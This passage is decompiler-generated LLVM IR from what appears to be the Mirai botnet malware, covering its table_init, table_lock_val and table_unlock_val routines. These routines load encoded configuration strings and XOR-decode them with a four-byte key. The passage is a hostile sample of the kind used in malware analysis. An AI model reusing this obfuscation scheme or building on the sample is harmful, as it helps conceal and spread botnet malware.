  %v4_10008b2c = zext i16 %v3_10008b2c to i32
  store i32 %v4_10008b2c, i32* %arg2, align 4
  %v0_10008b34.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_10008b34.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10008b34

dec_label_pc_10008b34:                            ; preds = %entry, %dec_label_pc_10008b2c
  %v1_10008b34 = phi i32 [ ptrtoint (i32* @global_var_10023834.233 to i32), %entry ], [ %v1_10008b34.pre, %dec_label_pc_10008b2c ]
  %v0_10008b34 = phi i32 [ %v1_10008b1c, %entry ], [ %v0_10008b34.pre, %dec_label_pc_10008b2c ]
  %v2_10008b34 = add i32 %v0_10008b34, %v1_10008b34
  %v3_10008b34 = inttoptr i32 %v2_10008b34 to i32*
  %v4_10008b34 = load i32, i32* %v3_10008b34, align 4
  store i32 %v4_10008b34, i32* %r3.global-to-local, align 4
  ret i32 %v4_10008b34

; uselistorder directives
  uselistorder i32 %v1_10008b1c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10008b34, { 1, 0 }
}

define i32 @table_lock_val(i32 %arg1) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r10.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %v1_10008b40 = mul i32 %arg1, 8
  %v2_10008b48 = add i32 %v1_10008b40, ptrtoint (i32* @global_var_10023834.233 to i32)
  %v1_10008b50 = add i32 %v1_10008b40, add (i32 ptrtoint (i32* @global_var_10023834.233 to i32), i32 4)
  %v2_10008b50 = inttoptr i32 %v1_10008b50 to i16*
  %v3_10008b50 = load i16, i16* %v2_10008b50, align 4
  %v3_10008b54 = icmp eq i16 %v3_10008b50, 0
  store i1 %v3_10008b54, i1* %cr7_eq.global-to-local, align 1
  %v3_10008b58 = load i32, i32* @global_var_100211a4.234, align 4
  %v1_10008b5c = udiv i32 %v3_10008b58, 16777216
  store i32 %v1_10008b5c, i32* %r5.global-to-local, align 4
  %v1_10008b60 = urem i32 %v3_10008b58, 256
  store i32 %v1_10008b60, i32* %r6.global-to-local, align 4
  %v1_10008b64 = call i32 @__asm_rlwinm(i32 %v3_10008b58, i32 24, i32 24, i32 31)
  %v1_10008b68 = call i32 @__asm_rlwinm(i32 %v3_10008b58, i32 16, i32 24, i32 31)
  store i32 %v1_10008b68, i32* @r8, align 4
  %v0_10008b6c = load i32, i32* @lr, align 4
  %v1_10008b6c = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10008b6c, i32 %v0_10008b6c)
  store i32 0, i32* %r10.global-to-local, align 4
  %v1_10008b74 = inttoptr i32 %v2_10008b48 to i32*
  br label %dec_label_pc_10008b74

dec_label_pc_10008b74:                            ; preds = %dec_label_pc_10008b74, %entry
  %v1_10008b80 = phi i32 [ %v1_10008bb4, %dec_label_pc_10008b74 ], [ 0, %entry ]
  %v2_10008b74 = load i32, i32* %v1_10008b74, align 4
  %v2_10008b78 = add i32 %v2_10008b74, %v1_10008b80
  %v3_10008b78 = inttoptr i32 %v2_10008b78 to i8*
  %v4_10008b78 = load i8, i8* %v3_10008b78, align 1
  %v5_10008b78 = zext i8 %v4_10008b78 to i32
  %v0_10008b7c = load i32, i32* %r6.global-to-local, align 4
  %v2_10008b7c = xor i32 %v0_10008b7c, %v5_10008b78
  %v3_10008b80 = trunc i32 %v2_10008b7c to i8
  store i8 %v3_10008b80, i8* %v3_10008b78, align 1
  %v2_10008b84 = load i32, i32* %v1_10008b74, align 4
  %v0_10008b88 = load i32, i32* %r10.global-to-local, align 4
  %v2_10008b88 = add i32 %v0_10008b88, %v2_10008b84
  %v3_10008b88 = inttoptr i32 %v2_10008b88 to i8*
  %v4_10008b88 = load i8, i8* %v3_10008b88, align 1
  %v5_10008b88 = zext i8 %v4_10008b88 to i32
  %v2_10008b8c = xor i32 %v5_10008b88, %v1_10008b64
  %v3_10008b90 = trunc i32 %v2_10008b8c to i8
  store i8 %v3_10008b90, i8* %v3_10008b88, align 1
  %v2_10008b94 = load i32, i32* %v1_10008b74, align 4
  %v0_10008b98 = load i32, i32* %r10.global-to-local, align 4
  %v2_10008b98 = add i32 %v0_10008b98, %v2_10008b94
  %v3_10008b98 = inttoptr i32 %v2_10008b98 to i8*
  %v4_10008b98 = load i8, i8* %v3_10008b98, align 1
  %v5_10008b98 = zext i8 %v4_10008b98 to i32
  %v2_10008b9c = xor i32 %v5_10008b98, %v1_10008b68
  %v3_10008ba0 = trunc i32 %v2_10008b9c to i8
  store i8 %v3_10008ba0, i8* %v3_10008b98, align 1
  %v2_10008ba4 = load i32, i32* %v1_10008b74, align 4
  %v0_10008ba8 = load i32, i32* %r10.global-to-local, align 4
  %v2_10008ba8 = add i32 %v0_10008ba8, %v2_10008ba4
  %v3_10008ba8 = inttoptr i32 %v2_10008ba8 to i8*
  %v4_10008ba8 = load i8, i8* %v3_10008ba8, align 1
  %v5_10008ba8 = zext i8 %v4_10008ba8 to i32
  %v0_10008bac = load i32, i32* %r5.global-to-local, align 4
  %v2_10008bac = xor i32 %v0_10008bac, %v5_10008ba8
  %v3_10008bb0 = trunc i32 %v2_10008bac to i8
  store i8 %v3_10008bb0, i8* %v3_10008ba8, align 1
  %v0_10008bb4 = load i32, i32* %r10.global-to-local, align 4
  %v1_10008bb4 = add i32 %v0_10008bb4, 1
  store i32 %v1_10008bb4, i32* %r10.global-to-local, align 4
  %v3_10008bb8 = load i16, i16* %v2_10008b50, align 4
  %v4_10008bb8 = zext i16 %v3_10008bb8 to i32
  %v3_10008bbc = icmp sgt i32 %v4_10008bb8, %v1_10008bb4
  %v4_10008bbc = icmp eq i32 %v4_10008bb8, %v1_10008bb4
  store i1 %v4_10008bbc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10008bbc, label %dec_label_pc_10008b74, label %dec_label_pc_10008bc4

dec_label_pc_10008bc4:                            ; preds = %dec_label_pc_10008b74
  ret i32 %v2_10008b48

; uselistorder directives
  uselistorder i32 %v4_10008bb8, { 1, 0 }
  uselistorder i32 %v1_10008bb4, { 2, 1, 3, 0 }
  uselistorder i32 %v3_10008b58, { 2, 3, 1, 0 }
  uselistorder i32 %v1_10008b40, { 1, 0 }
}

define i32 @table_unlock_val(i32 %arg1) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r10.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %v1_10008bcc = mul i32 %arg1, 8
  %v2_10008bd4 = add i32 %v1_10008bcc, ptrtoint (i32* @global_var_10023834.233 to i32)
  %v1_10008bdc = add i32 %v1_10008bcc, add (i32 ptrtoint (i32* @global_var_10023834.233 to i32), i32 4)
  %v2_10008bdc = inttoptr i32 %v1_10008bdc to i16*
  %v3_10008bdc = load i16, i16* %v2_10008bdc, align 4
  %v3_10008be0 = icmp eq i16 %v3_10008bdc, 0
  store i1 %v3_10008be0, i1* %cr7_eq.global-to-local, align 1
  %v3_10008be4 = load i32, i32* @global_var_100211a4.234, align 4
  %v1_10008be8 = udiv i32 %v3_10008be4, 16777216
  store i32 %v1_10008be8, i32* %r5.global-to-local, align 4
  %v1_10008bec = urem i32 %v3_10008be4, 256
  store i32 %v1_10008bec, i32* %r6.global-to-local, align 4
  %v1_10008bf0 = call i32 @__asm_rlwinm(i32 %v3_10008be4, i32 24, i32 24, i32 31)
  %v1_10008bf4 = call i32 @__asm_rlwinm(i32 %v3_10008be4, i32 16, i32 24, i32 31)
  store i32 %v1_10008bf4, i32* @r8, align 4
  %v0_10008bf8 = load i32, i32* @lr, align 4
  %v1_10008bf8 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10008bf8, i32 %v0_10008bf8)
  store i32 0, i32* %r10.global-to-local, align 4
  %v1_10008c00 = inttoptr i32 %v2_10008bd4 to i32*
  br label %dec_label_pc_10008c00

dec_label_pc_10008c00:                            ; preds = %dec_label_pc_10008c00, %entry
  %v1_10008c0c = phi i32 [ %v1_10008c40, %dec_label_pc_10008c00 ], [ 0, %entry ]
  %v2_10008c00 = load i32, i32* %v1_10008c00, align 4
  %v2_10008c04 = add i32 %v2_10008c00, %v1_10008c0c
  %v3_10008c04 = inttoptr i32 %v2_10008c04 to i8*
  %v4_10008c04 = load i8, i8* %v3_10008c04, align 1
  %v5_10008c04 = zext i8 %v4_10008c04 to i32
  %v0_10008c08 = load i32, i32* %r6.global-to-local, align 4
  %v2_10008c08 = xor i32 %v0_10008c08, %v5_10008c04
  %v3_10008c0c = trunc i32 %v2_10008c08 to i8
  store i8 %v3_10008c0c, i8* %v3_10008c04, align 1
  %v2_10008c10 = load i32, i32* %v1_10008c00, align 4
  %v0_10008c14 = load i32, i32* %r10.global-to-local, align 4
  %v2_10008c14 = add i32 %v0_10008c14, %v2_10008c10
  %v3_10008c14 = inttoptr i32 %v2_10008c14 to i8*
  %v4_10008c14 = load i8, i8* %v3_10008c14, align 1
  %v5_10008c14 = zext i8 %v4_10008c14 to i32
  %v2_10008c18 = xor i32 %v5_10008c14, %v1_10008bf0
  %v3_10008c1c = trunc i32 %v2_10008c18 to i8
  store i8 %v3_10008c1c, i8* %v3_10008c14, align 1
  %v2_10008c20 = load i32, i32* %v1_10008c00, align 4
  %v0_10008c24 = load i32, i32* %r10.global-to-local, align 4
  %v2_10008c24 = add i32 %v0_10008c24, %v2_10008c20
  %v3_10008c24 = inttoptr i32 %v2_10008c24 to i8*
  %v4_10008c24 = load i8, i8* %v3_10008c24, align 1
  %v5_10008c24 = zext i8 %v4_10008c24 to i32
  %v2_10008c28 = xor i32 %v5_10008c24, %v1_10008bf4
  %v3_10008c2c = trunc i32 %v2_10008c28 to i8
  store i8 %v3_10008c2c, i8* %v3_10008c24, align 1
  %v2_10008c30 = load i32, i32* %v1_10008c00, align 4
  %v0_10008c34 = load i32, i32* %r10.global-to-local, align 4
  %v2_10008c34 = add i32 %v0_10008c34, %v2_10008c30
  %v3_10008c34 = inttoptr i32 %v2_10008c34 to i8*
  %v4_10008c34 = load i8, i8* %v3_10008c34, align 1
  %v5_10008c34 = zext i8 %v4_10008c34 to i32
  %v0_10008c38 = load i32, i32* %r5.global-to-local, align 4
  %v2_10008c38 = xor i32 %v0_10008c38, %v5_10008c34
  %v3_10008c3c = trunc i32 %v2_10008c38 to i8
  store i8 %v3_10008c3c, i8* %v3_10008c34, align 1
  %v0_10008c40 = load i32, i32* %r10.global-to-local, align 4
  %v1_10008c40 = add i32 %v0_10008c40, 1
  store i32 %v1_10008c40, i32* %r10.global-to-local, align 4
  %v3_10008c44 = load i16, i16* %v2_10008bdc, align 4
  %v4_10008c44 = zext i16 %v3_10008c44 to i32
  %v3_10008c48 = icmp sgt i32 %v4_10008c44, %v1_10008c40
  %v4_10008c48 = icmp eq i32 %v4_10008c44, %v1_10008c40
  store i1 %v4_10008c48, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10008c48, label %dec_label_pc_10008c00, label %dec_label_pc_10008c50

dec_label_pc_10008c50:                            ; preds = %dec_label_pc_10008c00
  ret i32 %v2_10008bd4

; uselistorder directives
  uselistorder i32 %v4_10008c44, { 1, 0 }
  uselistorder i32 %v1_10008c40, { 2, 1, 3, 0 }
  uselistorder i32 %v3_10008be4, { 2, 3, 1, 0 }
  uselistorder i32 %v1_10008bcc, { 1, 0 }
  uselistorder i32 16777216, { 0, 1, 2, 3, 5, 4, 7, 6, 9, 8 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_10023834.233 to i32), i32 4), { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10023834.233 to i32), { 1, 3, 0, 2, 4 }
}

define i32 @table_init(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  store i32 5, i32* %r15.global-to-local, align 4
  store i32 14, i32* %r16.global-to-local, align 4
  store i32 19, i32* %r17.global-to-local, align 4
  store i32 16, i32* %r19.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10010394.235 to i32), i32* %r18.global-to-local, align 4
  %v0_10008c94 = load i32, i32* @r21, align 4
  %v0_10008c9c = load i32, i32* @r22, align 4
  store i32 8, i32* @r22, align 4
  %v0_10008ca4 = load i32, i32* @r23, align 4
  store i32 9, i32* @r23, align 4
  %v0_10008cac = load i32, i32* @r24, align 4
  store i32 23, i32* @r24, align 4
  %v0_10008cb4 = load i32, i32* @r25, align 4
  store i32 6, i32* @r25, align 4
  store i32 7, i32* @r26, align 4
  %v0_10008cc4 = load i32, i32* @r27, align 4
  store i32 2, i32* @r27, align 4
  %v0_10008ccc = load i32, i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_100103b8.236 to i32), i32* @r21, align 4
  store i32 268471516, i32* @lr, align 4
  %v1_10008cd8 = call i32 @malloc(i32 2)
  store i32 %v1_10008cd8, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10008cf8.238 to i32), i32* @lr, align 4
  %v3_10008cf4 = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_100102e4.237 to i32), i32 2, i32 2)
  %v0_10008cfc = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10008cfc, i32* @global_var_10023844.239, align 4
  store i32 268500992, i32* %r20.global-to-local, align 4
  %v0_10008d04 = load i32, i32* @r27, align 4
  %v1_10008d04 = trunc i32 %v0_10008d04 to i16
  store i16 %v1_10008d04, i16* bitcast (i32* @global_var_10023848.240 to i16*), align 4
  store i32 268471564, i32* @lr, align 4
  %v1_10008d08 = call i32 @malloc(i32 2)
  store i32 %v1_10008d08, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10008d20.242 to i32), i32* @lr, align 4
  %v3_10008d1c = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_100102e8.241 to i32), i32 2, i32 2)
  %v0_10008d24 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10008d24, i32* @global_var_10023854.243, align 4
  store i32 ptrtoint (i32* @global_var_100103c8.244 to i32), i32* %r20.global-to-local, align 4
  %v0_10008d2c = load i32, i32* @r27, align 4
  %v1_10008d2c = trunc i32 %v0_10008d2c to i16
  store i16 %v1_10008d2c, i16* bitcast (i32* @global_var_10023858.245 to i16*), align 4
  store i32 268471604, i32* @lr, align 4
  %v1_10008d30 = call i32 @malloc(i32 29)
  store i32 %v1_10008d30, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10008d48.247 to i32), i32* @lr, align 4
  %v3_10008d44 = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_100102ec.246 to i32), i32 29, i32 29)
  store i16 29, i16* bitcast (i32* @global_var_10023860.248 to i16*), align 4
  %v0_10008d54 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10008d54, i32* @global_var_1002385c.249, align 4
  store i32 268471644, i32* @lr, align 4
  %v1_10008d58 = call i32 @malloc(i32 7)
  store i32 %v1_10008d58, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10008d70.251 to i32), i32* @lr, align 4
  %v3_10008d6c = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_1001030c.250 to i32), i32 7, i32 7)
  %v0_10008d74 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10008d74, i32* @global_var_10023864.252, align 4
  %v0_10008d7c = load i32, i32* @r26, align 4
  %v1_10008d7c = trunc i32 %v0_10008d7c to i16
  store i16 %v1_10008d7c, i16* bitcast (i32* @global_var_10023868.253 to i16*), align 4
  store i32 268471684, i32* @lr, align 4
  %v1_10008d80 = call i32 @malloc(i32 5)
  store i32 %v1_10008d80, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10008d98.255 to i32), i32* @lr, align 4
  %v3_10008d94 = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_10010314.254 to i32), i32 5, i32 5)
  %v0_10008d9c = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10008d9c, i32* @global_var_1002386c.256, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_100103ac.257 to i32), i32* @r27, align 4
  %v0_10008da4 = load i32, i32* %r15.global-to-local, align 4
  %v1_10008da4 = trunc i32 %v0_10008da4 to i16
  store i16 %v1_10008da4, i16* bitcast (i32* @global_var_10023870.258 to i16*), align 4
  store i32 268471724, i32* @lr, align 4
  %v1_10008da8 = call i32 @malloc(i32 4)
  store i32 %v1_10008da8, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10008dc0.260 to i32), i32* @lr, align 4
  %v3_10008dbc = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_1001031c.259 to i32), i32 4, i32 4)
  store i16 4, i16* bitcast (i32* @global_var_10023878.261 to i16*), align 4
  %v0_10008dcc = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10008dcc, i32* @global_var_10023874.262, align 4
  store i32 268471764, i32* @lr, align 4
  %v1_10008dd0 = call i32 @malloc(i32 14)
  store i32 %v1_10008dd0, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10008de8.264 to i32), i32* @lr, align 4
  %v3_10008de4 = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_10010324.263 to i32), i32 14, i32 14)
  %v0_10008dec = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10008dec, i32* @global_var_1002387c.265, align 4
  %v0_10008df0 = load i32, i32* %r16.global-to-local, align 4
  %v1_10008df0 = trunc i32 %v0_10008df0 to i16
  store i16 %v1_10008df0, i16* bitcast (i32* @global_var_10023880.266 to i16*), align 4
  store i32 268471800, i32* @lr, align 4
  %v1_10008df4 = call i32 @malloc(i32 6)
  store i32 %v1_10008df4, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10008e0c.268 to i32), i32* @lr, align 4
  %v3_10008e08 = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_10010334.267 to i32), i32 6, i32 6)
  %v0_10008e10 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10008e10, i32* @global_var_10023884.269, align 4
  %v0_10008e14 = load i32, i32* @r25, align 4
  %v1_10008e14 = trunc i32 %v0_10008e14 to i16
  store i16 %v1_10008e14, i16* bitcast (i32* @global_var_10023888.270 to i16*), align 4
  store i32 268471836, i32* @lr, align 4
  %v1_10008e18 = call i32 @malloc(i32 8)
  store i32 %v1_10008e18, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10008e30.272 to i32), i32* @lr, align 4
  %v3_10008e2c = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_1001033c.271 to i32), i32 8, i32 8)
  %v0_10008e34 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10008e34, i32* @global_var_1002388c.273, align 4
  %v0_10008e38 = load i32, i32* @r22, align 4
  %v1_10008e38 = trunc i32 %v0_10008e38 to i16
  store i16 %v1_10008e38, i16* bitcast (i32* @global_var_10023890.274 to i16*), align 4
  store i32 268471872, i32* @lr, align 4
  %v1_10008e3c = call i32 @malloc(i32 7)
  store i32 %v1_10008e3c, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10008e54.276 to i32), i32* @lr, align 4
  %v3_10008e50 = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_10010348.275 to i32), i32 7, i32 7)
  %v0_10008e58 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10008e58, i32* @global_var_10023894.277, align 4
  %v0_10008e5c = load i32, i32* @r26, align 4
  %v1_10008e5c = trunc i32 %v0_10008e5c to i16
  store i16 %v1_10008e5c, i16* bitcast (i32* @global_var_10023898.278 to i16*), align 4
  store i32 268471908, i32* @lr, align 4
  %v1_10008e60 = call i32 @malloc(i32 16)
  store i32 %v1_10008e60, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10008e78.280 to i32), i32* @lr, align 4
  %v3_10008e74 = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_10010350.279 to i32), i32 16, i32 16)
  %v0_10008e7c = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10008e7c, i32* @global_var_1002389c.281, align 4
  %v0_10008e80 = load i32, i32* %r19.global-to-local, align 4
  %v1_10008e80 = trunc i32 %v0_10008e80 to i16
  store i16 %v1_10008e80, i16* bitcast (i32* @global_var_100238a0.282 to i16*), align 4
  store i32 268471944, i32* @lr, align 4
  %v1_10008e84 = call i32 @malloc(i32 14)
  store i32 %v1_10008e84, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10008e9c.284 to i32), i32* @lr, align 4
  %v3_10008e98 = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_10010364.283 to i32), i32 14, i32 14)
  %v0_10008ea0 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10008ea0, i32* @global_var_100238a4.285, align 4
  %v0_10008ea4 = load i32, i32* %r16.global-to-local, align 4
  %v1_10008ea4 = trunc i32 %v0_10008ea4 to i16
  store i16 %v1_10008ea4, i16* bitcast (i32* @global_var_100238a8.286 to i16*), align 4
  store i32 268471980, i32* @lr, align 4
  %v1_10008ea8 = call i32 @malloc(i32 9)
  store i32 %v1_10008ea8, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10008ec0.288 to i32), i32* @lr, align 4
  %v3_10008ebc = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_10010374.287 to i32), i32 9, i32 9)
  %v0_10008ec4 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10008ec4, i32* @global_var_100238ac.289, align 4
  %v0_10008ec8 = load i32, i32* @r23, align 4
  %v1_10008ec8 = trunc i32 %v0_10008ec8 to i16
  store i16 %v1_10008ec8, i16* bitcast (i32* @global_var_100238b0.290 to i16*), align 4
  store i32 268472016, i32* @lr, align 4
  %v1_10008ecc = call i32 @malloc(i32 19)
  store i32 %v1_10008ecc, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10008ee4.292 to i32), i32* @lr, align 4
  %v3_10008ee0 = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_10010380.291 to i32), i32 19, i32 19)
  %v0_10008ee8 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10008ee8, i32* @global_var_100238b4.293, align 4
  %v0_10008eec = load i32, i32* %r17.global-to-local, align 4
  %v1_10008eec = trunc i32 %v0_10008eec to i16
  store i16 %v1_10008eec, i16* bitcast (i32* @global_var_100238b8.294 to i16*), align 4
  store i32 268472052, i32* @lr, align 4
  %v1_10008ef0 = call i32 @malloc(i32 23)
  %v0_10008ef4 = load i32, i32* %r18.global-to-local, align 4
  store i32 %v1_10008ef0, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10008f04.295 to i32), i32* @lr, align 4
  %v3_10008f00 = call i32 @util_memcpy(i32 %v0_10008ef4, i32 23, i32 23)
  %v0_10008f08 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10008f08, i32* @global_var_100238bc.296, align 4
  %v0_10008f0c = load i32, i32* @r24, align 4
  %v1_10008f0c = trunc i32 %v0_10008f0c to i16
  store i16 %v1_10008f0c, i16* bitcast (i32* @global_var_100238c0.297 to i16*), align 4
  store i32 268472084, i32* @lr, align 4
  %v1_10008f10 = call i32 @malloc(i32 8)
  %v0_10008f14 = load i32, i32* @r27, align 4
  store i32 %v1_10008f10, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10008f24.298 to i32), i32* @lr, align 4
  %v4_10008f20 = call i32 @util_memcpy(i32 %v0_10008f14, i32 8, i32 8)
  %v0_10008f28 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10008f28, i32* @global_var_100238c4.299, align 4
  %v0_10008f2c = load i32, i32* @r22, align 4
  %v1_10008f2c = trunc i32 %v0_10008f2c to i16
  store i16 %v1_10008f2c, i16* bitcast (i32* @global_var_100238c8.300 to i16*), align 4
  store i32 268472116, i32* @lr, align 4
  %v1_10008f30 = call i32 @malloc(i32 14)
  %v0_10008f34 = load i32, i32* @r21, align 4
  store i32 %v1_10008f30, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10008f44.301 to i32), i32* @lr, align 4
  %v3_10008f40 = call i32 @util_memcpy(i32 %v0_10008f34, i32 14, i32 14)
  %v0_10008f48 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10008f48, i32* @global_var_100238cc.302, align 4
  %v0_10008f4c = load i32, i32* %r16.global-to-local, align 4
  %v1_10008f4c = trunc i32 %v0_10008f4c to i16
  store i16 %v1_10008f4c, i16* bitcast (i32* @global_var_100238d0.303 to i16*), align 4
  store i32 268472148, i32* @lr, align 4
  %v1_10008f50 = call i32 @malloc(i32 19)
  %v0_10008f54 = load i32, i32* %r20.global-to-local, align 4
  store i32 %v1_10008f50, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10008f64.304 to i32), i32* @lr, align 4
  %v3_10008f60 = call i32 @util_memcpy(i32 %v0_10008f54, i32 19, i32 19)
  %v0_10008f68 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10008f68, i32* @global_var_100238d4.305, align 4
  %v0_10008f6c = load i32, i32* %r17.global-to-local, align 4
  %v1_10008f6c = trunc i32 %v0_10008f6c to i16
  store i16 %v1_10008f6c, i16* bitcast (i32* @global_var_100238d8.306 to i16*), align 4
  store i32 268472180, i32* @lr, align 4
  %v1_10008f70 = call i32 @malloc(i32 23)
  store i32 %v1_10008f70, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10008f88.308 to i32), i32* @lr, align 4
  %v3_10008f84 = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_100103dc.307 to i32), i32 23, i32 23)
  %v0_10008f8c = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10008f8c, i32* @global_var_100238dc.309, align 4
  %v0_10008f90 = load i32, i32* @r24, align 4
  %v1_10008f90 = trunc i32 %v0_10008f90 to i16
  store i16 %v1_10008f90, i16* bitcast (i32* @global_var_100238e0.310 to i16*), align 4
  store i32 268472216, i32* @lr, align 4
  %v1_10008f94 = call i32 @malloc(i32 24)
  store i32 %v1_10008f94, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10008fac.312 to i32), i32* @lr, align 4
  %v3_10008fa8 = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_100103f4.311 to i32), i32 24, i32 24)
  store i16 24, i16* bitcast (i32* @global_var_100238e8.313 to i16*), align 4
  %v0_10008fb8 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10008fb8, i32* @global_var_100238e4.314, align 4
  store i32 268472256, i32* @lr, align 4
  %v1_10008fbc = call i32 @malloc(i32 15)
  store i32 %v1_10008fbc, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10008fd4.316 to i32), i32* @lr, align 4
  %v3_10008fd0 = call i32 @util_memcpy(i32 ptrtoint (i32* @global_var_10010410.315 to i32), i32 15, i32 15)
  store i16 15, i16* bitcast (i32* @global_var_100238f0.317 to i16*), align 4
  %v0_10008fe0 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10008fe0, i32* @global_var_100238ec.318, align 4
  store i32 268472296, i32* @lr, align 4
  %v1_10008fe4 = call i32 @malloc(i32 6)
  store i32 %v1_10008fe4, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10008ffc.320 to i32), i32* @lr, align 4
  %v4_10008ff8 = call i32 @util_memcpy(i32 ptrtoint ([7 x i8]* @global_var_10010420.319 to i32), i32 6, i32 6)
  %v0_10009000 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10009000, i32* @global_var_100238f4.321, align 4
  %v0_10009004 = load i32, i32* @r25, align 4
  %v1_10009004 = trunc i32 %v0_10009004 to i16
  store i16 %v1_10009004, i16* bitcast (i32* @global_var_100238f8.322 to i16*), align 4
  store i32 268472332, i32* @lr, align 4
  %v1_10009008 = call i32 @malloc(i32 7)
  store i32 %v1_10009008, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10009020.324 to i32), i32* @lr, align 4
  %v4_1000901c = call i32 @util_memcpy(i32 ptrtoint ([8 x i8]* @global_var_10010428.323 to i32), i32 7, i32 7)
  %v0_10009024 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10009024, i32* @global_var_100238fc.325, align 4
  %v0_10009028 = load i32, i32* @r26, align 4
  %v1_10009028 = trunc i32 %v0_10009028 to i16
  store i16 %v1_10009028, i16* bitcast (i32* @global_var_10023900.326 to i16*), align 4
  store i32 268472368, i32* @lr, align 4
  %v1_1000902c = call i32 @malloc(i32 7)
  store i32 %v1_1000902c, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10009044.328 to i32), i32* @lr, align 4
  %v4_10009040 = call i32 @util_memcpy(i32 ptrtoint ([8 x i8]* @global_var_10010430.327 to i32), i32 7, i32 7)
  %v0_10009048 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10009048, i32* @global_var_10023904.329, align 4
  %v0_1000904c = load i32, i32* @r26, align 4
